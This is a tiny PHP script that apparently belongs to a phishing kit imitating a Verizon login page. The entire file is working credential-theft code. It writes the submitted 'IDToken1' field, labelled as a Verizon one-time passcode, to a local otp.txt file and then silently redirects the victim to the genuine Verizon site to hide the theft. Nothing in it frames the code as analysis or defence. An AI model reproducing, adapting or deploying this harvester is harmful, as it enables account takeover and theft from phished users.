<?php
file_put_contents("otp.txt", "Verizon OTP : " . $email = $_POST['IDToken1'] . "\n", FILE_APPEND);
header('Location: https://www.verizon.com');
?>
